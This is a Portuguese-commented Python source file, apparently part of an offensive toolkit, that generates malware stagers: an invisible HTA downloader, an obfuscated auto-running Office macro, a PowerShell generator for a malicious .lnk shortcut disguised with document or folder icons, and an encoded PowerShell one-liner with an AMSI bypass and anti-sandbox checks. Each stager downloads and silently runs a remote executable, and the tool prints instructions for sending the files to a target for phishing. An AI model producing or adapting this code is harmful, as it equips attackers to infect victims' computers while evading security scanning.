# strategies/stager.py (Versão Avançada)

import base64
import questionary
import random
import string
from pathlib import Path
from rich.console import Console
from rich.panel import Panel

# Diretório de payloads na raiz do projeto
PAYLOADS_DIR = Path(__file__).parent.parent / 'payloads'

def build_hta_stager(payload_url: str, output_filename_on_target: str) -> str:
    """
    Gera o código para um arquivo .hta malicioso que baixa e executa um payload.
    Usa VBScript e objetos COM para evasão.
    """
    # Gera nomes de variáveis aleatórios para o VBScript para dificultar a análise estática.
    var_url = ''.join(random.choices(string.ascii_lowercase, k=8))
    var_path = ''.join(random.choices(string.ascii_lowercase, k=8))
    var_http = ''.join(random.choices(string.ascii_lowercase, k=8 ))
    var_stream = ''.join(random.choices(string.ascii_lowercase, k=8))
    var_shell = ''.join(random.choices(string.ascii_lowercase, k=8))

    # Template do VBScript que fará o trabalho sujo.
    # On Error Resume Next: Ignora erros, tornando a falha silenciosa.
    # CreateObject: Usa objetos COM legítimos do Windows para a tarefa.
    # WScript.Shell: Para executar comandos e expandir variáveis de ambiente.
    # MSXML2.XMLHTTP: Para fazer a requisição web.
    # Adodb.Stream: Para salvar os bytes brutos do .exe no disco.
    vb_script = f"""
    On Error Resume Next
    Dim {var_url}, {var_path}, {var_http}, {var_stream}, {var_shell}
    
    {var_url} = "{payload_url}"
    Set {var_shell} = CreateObject("WScript.Shell" )
    {var_path} = {var_shell}.ExpandEnvironmentStrings("%TEMP%") & "\\{output_filename_on_target}"
    
    Set {var_http} = CreateObject("MSXML2.XMLHTTP" )
    {var_http}.open "GET", {var_url}, False
    {var_http}.send
    
    If {var_http}.Status = 200 Then
        Set {var_stream} = CreateObject("Adodb.Stream" )
        {var_stream}.Open
        {var_stream}.Type = 1 'adTypeBinary
        {var_stream}.Write {var_http}.responseBody
        {var_stream}.SaveToFile {var_path}, 2 'adSaveCreateOverWrite
        {var_stream}.Close
        {var_shell}.Run {var_path}, 0, False 'O '0' oculta a janela do processo
    End If
    
    window.close( )
    """

    # Template do arquivo HTA que define a aplicação e executa o VBScript.
    # As propriedades do HTA são definidas para torná-lo completamente invisível.
    hta_code = f"""
    <script language="VBScript">
        {vb_script}
    </script>
    <hta:application
        id="oBao"
        applicationname="hta_stager"
        border="none"
        caption="no"
        showintaskbar="no"
        singleinstance="yes"
        sysmenu="no"
        windowstate="minimize"
        navigable="yes"
    />
    """
    return hta_code


def build_vba_macro(payload_url: str, output_filename_on_target: str) -> str:
    """
    Gera código VBA ofuscado para ser usado em uma macro do Office.
    """
    
    def vba_obfuscate_string(s: str) -> str:
        """Converte uma string em uma concatenação de ChrW() para VBA."""
        return " & ".join([f"ChrW({ord(c)})" for c in s])

    # Nomes de objetos e métodos que queremos ofuscar
    obj_shell = vba_obfuscate_string("WScript.Shell")
    obj_http = vba_obfuscate_string("MSXML2.XMLHTTP" )
    obj_stream = vba_obfuscate_string("ADODB.Stream")
    
    method_run = vba_obfuscate_string("Run")
    method_open = vba_obfuscate_string("Open")
    method_send = vba_obfuscate_string("Send")
    method_write = vba_obfuscate_string("Write")
    method_save = vba_obfuscate_string("SaveToFile")
    method_close = vba_obfuscate_string("Close")
    
    # Nomes de variáveis aleatórios
    var_url = ''.join(random.choices(string.ascii_lowercase, k=8))
    var_path = ''.join(random.choices(string.ascii_lowercase, k=8))
    var_obj_http = ''.join(random.choices(string.ascii_lowercase, k=8 ))
    var_obj_stream = ''.join(random.choices(string.ascii_lowercase, k=8))
    var_obj_shell = ''.join(random.choices(string.ascii_lowercase, k=8))

    # Template do código VBA
    vba_code = f"""
' Código gerado por GeminiBuilder. Cole isso no editor de VBA (Alt+F11) de um documento do Office.
' Associe esta macro a um evento como AutoOpen() ou Document_Open() para execução automática.

Private Sub AutoOpen()
    On Error Resume Next
    
    Dim {var_url} As String
    Dim {var_path} As String
    Dim {var_obj_http} As Object
    Dim {var_obj_stream} As Object
    Dim {var_obj_shell} As Object
    
    {var_url} = "{payload_url}"
    
    Set {var_obj_shell} = CreateObject({obj_shell} )
    {var_path} = {var_obj_shell}.ExpandEnvironmentStrings("%TEMP%") & "\\{output_filename_on_target}"
    
    Set {var_obj_http} = CreateObject({obj_http} )
    
    CallByName {var_obj_http}, {method_open}, VbMethod, "GET", {var_url}, False
    CallByName {var_obj_http}, {method_send}, VbMethod
    
    If {var_obj_http}.Status = 200 Then
        Set {var_obj_stream} = CreateObject({obj_stream} )
        CallByName {var_obj_stream}, {method_open}, VbMethod
        {var_obj_stream}.Type = 1 ' adTypeBinary
        CallByName {var_obj_stream}, {method_write}, VbMethod, {var_obj_http}.responseBody
        CallByName {var_obj_stream}, {method_save}, VbMethod, {var_path}, 2 ' adSaveCreateOverWrite
        CallByName {var_obj_stream}, {method_close}, VbMethod
        
        ' Executa o payload de forma oculta
        CallByName {var_obj_shell}, {method_run}, VbMethod, {var_path}, 0, False
    End If
    
End Sub

' Para o Excel, use Workbook_Open( ) em vez de AutoOpen()
Private Sub Workbook_Open()
    AutoOpen
End Sub
"""
    return vba_code




def build_lnk_generator_script(payload_url: str, lnk_filename: str, icon_path: str) -> str:
    """
    Gera um SCRIPT POWERSHELL que, quando executado, cria um arquivo .lnk malicioso.
    """
    # 1. Comando PowerShell que o .LNK irá executar (o payload final)
    #    Este é um stager PowerShell simples, codificado em Base64.
    ps_payload_command = (
        f"$p = Join-Path $env:TEMP 'update.exe'; "
        f"(New-Object System.Net.WebClient).DownloadFile('{payload_url}', $p); "
        f"Start-Process -FilePath $p -WindowStyle Hidden"
    )
    encoded_ps_payload = base64.b64encode(ps_payload_command.encode('utf-16-le')).decode('utf-8')

    # 2. O comando que será colocado no campo "Alvo" do atalho.
    #    Ele chama o powershell com o payload codificado.
    target_command = f"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded_ps_payload}"
    
    # 3. O script PowerShell que VAI CRIAR o atalho na sua máquina.
    #    Ele usa o objeto COM 'WScript.Shell' para criar e configurar o .lnk.
    generator_script = f"""
# Script para gerar o arquivo .LNK malicioso
# Salve este script como 'generate_lnk.ps1' e execute-o na sua máquina.

$ErrorActionPreference = "Stop"

try {{
    # Caminho onde o arquivo .lnk será salvo (na mesma pasta que este script)
    $LnkFile = Join-Path $PSScriptRoot "{lnk_filename}"

    # Comando alvo que o atalho irá executar
    $Target = "{target_command}"

    # Ícone a ser usado pelo atalho. Use caminhos de sistema para ícones comuns.
    # Ex: %SystemRoot%\\System32\\imageres.dll,1 (ícone de pasta)
    # Ex: %SystemRoot%\\System32\\shell32.dll,21 (ícone de ajuda)
    $Icon = "{icon_path}"

    # Cria o objeto Shell para manipular o atalho
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($LnkFile)

    # Define as propriedades do atalho
    $Shortcut.TargetPath = "C:\\Windows\\System32\\cmd.exe"
    $Shortcut.Arguments = "/c $Target" # Usa cmd.exe /c para ofuscar a chamada direta ao PowerShell
    $Shortcut.WindowStyle = 7 # 7 = Iniciar minimizado e inativo
    $Shortcut.IconLocation = $Icon
    $Shortcut.Description = "" # Descrição vazia

    # Salva o arquivo .lnk
    $Shortcut.Save()

    Write-Host "[+] Sucesso! Atalho malicioso salvo em:" -ForegroundColor Green
    Write-Host $LnkFile -ForegroundColor Yellow

}}
catch {{
    Write-Error "Falha ao gerar o atalho: $_"
}}
"""
    return generator_script


# --- GERADOR DE OFUSCAÇÃO DE POWERSHELL ---

def obfuscate_ps(item: str) -> str:
    """Ofusca uma string em PowerShell dividindo-a e juntando-a com concatenação."""
    if not item:
        return "''"
    # Quebra a string em 2 ou 3 partes para variar
    if len(item) > 4 and random.choice([True, False]):
        split_point = random.randint(2, len(item) - 2)
        part1 = item[:split_point]
        part2 = item[split_point:]
        return f"('{part1}' + '{part2}')"
    else:
        # Para strings curtas ou por aleatoriedade, não ofusca
        return f"'{item}'"

# --- BIBLIOTECA DE TÉCNICAS AVANÇADAS ---

TECHNIQUES = {
    "anti_sandbox": {
        "check_ram": """
if ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB -lt 3.8) {{ exit }}
""",
        "check_cpu": """
if ((Get-CimInstance Win32_Processor).NumberOfCores -lt 2) {{ exit }}
""",
        "check_uptime": """
$uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
if ($uptime.TotalMinutes -lt 10) {{ exit }}
"""
    },
    "amsi_bypass": {
        "matt_graeber": """
try {
    $w = 'System.Management.Automation.AmsiUtils';
    $c = 'amsiInitFailed';
    $f = [System.Reflection.BindingFlags]'NonPublic,Static';
    $fi = [type]$w.GetField($c, $f);
    if ($fi) { $fi.SetValue($null, $true) };
} catch {}
"""
    },
    "download": {
        "IWR": """
$wc = New-Object System.Net.WebClient;
$wc.DownloadFile({url}, {path})
""",
        "BitsTransfer": """
Start-BitsTransfer -Source {url} -Destination {path}
"""
    },
    "execution": {
        "Start-Process": "Start-Process -FilePath {path} -WindowStyle Hidden",
        "Invoke-Item": "Invoke-Item -Path {path}",
        "InMemory-IEX": """
$p = ({iwr} -Uri {url} -UseBasicParsing).Content;
{iex} $p
"""
    }
}

# --- CLASSE DO BUILDER ---

class StagerBuilder:
    def __init__(self, config: dict):
        self.config = config
        self.console = Console()

    def build(self):
        self.console.print("\n[bold blue]Iniciando geração do stager avançado...[/bold blue]")
        
        # --- Montagem do Script PowerShell ---
        script_parts = []

        # 1. Adiciona Bypass da AMSI (se escolhido)
        if self.config.get("amsi_bypass_method") != "Nenhum":
            script_parts.append(TECHNIQUES["amsi_bypass"][self.config["amsi_bypass_method"]])

        # 2. Adiciona Checagens Anti-Sandbox (se escolhidas)
        for check in self.config.get("anti_sandbox_checks", []):
            script_parts.append(TECHNIQUES["anti_sandbox"][check])

        # 3. Lógica de Download e Execução
        payload_url = obfuscate_ps(self.config["payload_url"])
        
        if self.config["execution_method"] == "InMemory-IEX":
            # Execução em memória
            iwr_obf = obfuscate_ps("Invoke-WebRequest")
            iex_obf = obfuscate_ps("Invoke-Expression")
            exec_part = TECHNIQUES["execution"]["InMemory-IEX"].format(iwr=iwr_obf, url=payload_url, iex=iex_obf)
            script_parts.append(exec_part)
        else:
            # Execução baseada em arquivo
            temp_dir = f"$env:{self.config['stealth_path']}"
            filename = obfuscate_ps(self.config["filename"])
            full_path_var = f"$fp = Join-Path -Path {temp_dir} -ChildPath {filename}"
            script_parts.append(full_path_var)

            # Lógica de Download
            if self.config["download_method"] == "IWR":
                
                download_part = TECHNIQUES["download"]["IWR"].format(url=payload_url, path='$fp')
            else: # BitsTransfer
                download_part = TECHNIQUES["download"]["BitsTransfer"].format(url=payload_url, path='$fp')
            script_parts.append(download_part)

            # Lógica de Execução
            exec_part = TECHNIQUES["execution"][self.config["execution_method"]].format(path='$fp')
            script_parts.append(exec_part)

        # Junta todas as partes do script
        final_ps_script = "; ".join(p.strip() for p in script_parts if p.strip())

        # Codifica o script final para o one-liner
        encoded_script = base64.b64encode(final_ps_script.encode('utf-16-le')).decode('utf-8')
        final_command = f"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {encoded_script}"

        # Exibe e salva o resultado
        self.console.print(Panel(final_command, title="[bold green]Comando do Stager Avançado (Copie e Execute no Alvo)[/bold green]", border_style="green", expand=True))
        
        if self.config.get('save_to_file', False):
            try:
                PAYLOADS_DIR.mkdir(exist_ok=True)
                output_path = PAYLOADS_DIR / self.config['output_filename']
                output_path.write_text(final_command, encoding='utf-8')
                self.console.print(f"\n[bold green]SUCESSO: Stager também salvo em: {output_path}[/bold green]")
            except Exception as e:
                self.console.print(f"\n[bold red]ERRO: Falha ao salvar o stager em arquivo: {e}[/bold red]")

# --- FUNÇÃO INTERATIVA ---

def run_stager_interactive():
    console = Console()
    try:
        # Pergunta principal: qual tipo de stager?
        stager_type = questionary.select(
            "Qual tipo de stager você deseja gerar?",
            choices=[
                "HTA (VBScript - Bom para Phishing)",
                "Macro do Office (VBA - Para Documentos)",
                "Atalho Malicioso (.LNK - Engenharia Social)",
                "PowerShell Avançado"
            ],
            default="HTA (VBScript - Bom para Phishing)"
        ).ask()

        if stager_type is None:
            raise KeyboardInterrupt

        # --- ROTA PARA O GERADOR HTA ---
        if stager_type == "HTA (VBScript - Bom para Phishing)":
            console.print(Panel("Gerador de Stager HTA", style="bold cyan", border_style="cyan", expand=False))
            payload_url = questionary.text('URL do payload (.exe hospedado):', validate=lambda t: t.startswith('http' )).ask()
            output_filename_on_target = questionary.text('Nome do arquivo no alvo (ex: update.exe):', default='updater.exe').ask()
            save_filename = questionary.text('Nome do arquivo .hta para salvar:', default='run.hta').ask()

            if not all([payload_url, output_filename_on_target, save_filename]):
                raise KeyboardInterrupt

            hta_content = build_hta_stager(payload_url, output_filename_on_target)
            
            PAYLOADS_DIR.mkdir(exist_ok=True)
            output_path = PAYLOADS_DIR / save_filename
            output_path.write_text(hta_content, encoding='utf-8')
            
            console.print(f"\n[bold green]SUCESSO: Stager HTA salvo em: {output_path}[/bold green]")
            console.print(f"[info]Para executar no alvo, envie o arquivo e peça para o usuário dar um duplo clique, ou use o comando: [yellow]mshta.exe {output_path.name}[/yellow][/info]")
            return


        
        elif stager_type == "Macro do Office (VBA - Para Documentos)":
            console.print(Panel("Gerador de Macro VBA", style="bold yellow", border_style="yellow", expand=False))
            payload_url = questionary.text('URL do payload (.exe hospedado):', validate=lambda t: t.startswith('http' )).ask()
            output_filename_on_target = questionary.text('Nome do arquivo no alvo (ex: update.exe):', default='msedge_updater.exe').ask()
            save_filename = questionary.text('Nome do arquivo .vba para salvar o código:', default='macro.vba').ask()

            if not all([payload_url, output_filename_on_target, save_filename]):
                raise KeyboardInterrupt

            vba_content = build_vba_macro(payload_url, output_filename_on_target)
            
            PAYLOADS_DIR.mkdir(exist_ok=True)
            output_path = PAYLOADS_DIR / save_filename
            output_path.write_text(vba_content, encoding='utf-8')
            
            console.print(f"\n[bold green]SUCESSO: Código da macro salvo em: {output_path}[/bold green]")
            console.print("[bold yellow]Instruções:[/bold yellow]")
            console.print("1. Abra um documento do Word/Excel.")
            console.print("2. Pressione [cyan]Alt + F11[/cyan] para abrir o editor de VBA.")
            console.print("3. No painel esquerdo, encontre seu documento, clique com o botão direito -> [cyan]Inserir -> Módulo[/cyan].")
            console.print(f"4. Copie todo o conteúdo de '[cyan]{output_path.name}[/cyan]' e cole no módulo em branco.")
            console.print("5. Salve o documento como um 'Documento Habilitado para Macro' ([cyan].docm[/cyan] ou [cyan].xlsm[/cyan]).")
            console.print("6. Envie o documento para o alvo. A macro será executada quando o documento for aberto e as macros habilitadas.")
            return


        elif stager_type.startswith("Atalho"):
            console.print(Panel("Gerador de Stager .LNK", style="bold blue", border_style="blue", expand=False))
            payload_url = questionary.text('URL do payload (.exe hospedado):', validate=lambda t: t.startswith('http' )).ask()
            lnk_filename = questionary.text('Nome do arquivo de atalho a ser criado (ex: DocumentoImportante.lnk):', default='Faturas.lnk').ask()
            
            # Oferece uma lista de ícones comuns para facilitar
            icon_choice = questionary.select(
                "Qual ícone o atalho deve usar?",
                choices=[
                    questionary.Choice("Pasta", value="%SystemRoot%\\System32\\imageres.dll,3"),
                    questionary.Choice("Documento de Texto", value="%SystemRoot%\\System32\\imageres.dll,70"),
                    questionary.Choice("PDF", value="%SystemRoot%\\System32\\imageres.dll,76"),
                    questionary.Choice("Google Chrome", value="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe,0"),
                    "Outro (especificar caminho)"
                ]
            ).ask()

            if icon_choice == "Outro (especificar caminho)":
                icon_path = questionary.text("Caminho para o ícone (ex: C:\\caminho\\icone.ico,0):").ask()
            else:
                icon_path = icon_choice

            save_filename = questionary.text('Nome do script gerador a ser salvo (ex: generate_lnk.ps1):', default='generate_lnk.ps1').ask()

            if not all([payload_url, lnk_filename, icon_path, save_filename]):
                raise KeyboardInterrupt

            generator_script_content = build_lnk_generator_script(payload_url, lnk_filename, icon_path)
            
            PAYLOADS_DIR.mkdir(exist_ok=True)
            output_path = PAYLOADS_DIR / save_filename
            output_path.write_text(generator_script_content, encoding='utf-8')
            
            console.print(f"\n[bold green]SUCESSO: Script gerador de LNK salvo em: {output_path}[/bold green]")
            console.print("[bold yellow]Instruções:[/bold yellow]")
            console.print(f"1. Abra um terminal PowerShell e execute o script que acabamos de criar:")
            console.print(f"   [cyan]cd {PAYLOADS_DIR.resolve()}[/cyan]")
            console.print(f"   [cyan].\\{save_filename}[/cyan]")
            console.print(f"2. Um novo arquivo chamado '[cyan]{lnk_filename}[/cyan]' será criado na mesma pasta.")
            console.print("3. Envie este arquivo .lnk para o alvo.")
            return


        # --- ROTA PARA O GERADOR POWERSHELL (código anterior) ---
        elif stager_type == "PowerShell Avançado":
            console.print(Panel("Gerador de Stager PowerShell Avançado", style="bold magenta", border_style="magenta", expand=False))
            
            answers = {}
            answers['payload_url'] = questionary.text('URL do payload (.exe ou .py hospedado):', validate=lambda t: t.startswith('http' )).ask()
            
            answers['anti_sandbox_checks'] = questionary.checkbox(
                'Técnicas Anti-Sandbox:',
                choices=[
                    questionary.Choice("Verificar RAM < 4GB", value="check_ram", checked=True),
                    questionary.Choice("Verificar CPU < 2 Cores", value="check_cpu", checked=True),
                    questionary.Choice("Verificar Uptime < 10 Minutos", value="check_uptime")
                ]).ask()

            answers['amsi_bypass_method'] = questionary.select('Método de Bypass da AMSI:', choices=["matt_graeber", "Nenhum"], default="matt_graeber").ask()
            answers['execution_method'] = questionary.select('Método de Execução:', choices=["InMemory-IEX", "Start-Process", "Invoke-Item"], default="Start-Process").ask()

            if answers['execution_method'] != 'InMemory-IEX':
                answers['download_method'] = questionary.select('Método de Download:', choices=["BITS (Furtivo)", "WebClient (Tradicional)"], default="BITS (Furtivo)").ask()
                answers['filename'] = questionary.text('Nome do arquivo no alvo:', default='updater.exe').ask()
                answers['stealth_path'] = questionary.select('Caminho de instalação:', choices=['Temp', 'LocalAppData', 'AppData'], default='Temp').ask()

            if questionary.confirm("Salvar o comando do stager em um arquivo .ps1?", default=True).ask():
                answers['save_to_file'] = True
                answers['output_filename'] = questionary.text("Nome do arquivo de saída:", default="stager.ps1").ask()
            else:
                answers['save_to_file'] = False

            if not answers.get('payload_url'):
                raise KeyboardInterrupt

            stager_builder = StagerBuilder(answers)
            stager_builder.build()

    except (KeyboardInterrupt, TypeError):
         console.print("\n[bold red]Operação cancelada pelo usuário.[/bold red]")
    except Exception as e:
        console.print(f"[bold red]Ocorreu um erro inesperado: {e}[/bold red]")
        import traceback
        console.print(traceback.format_exc())

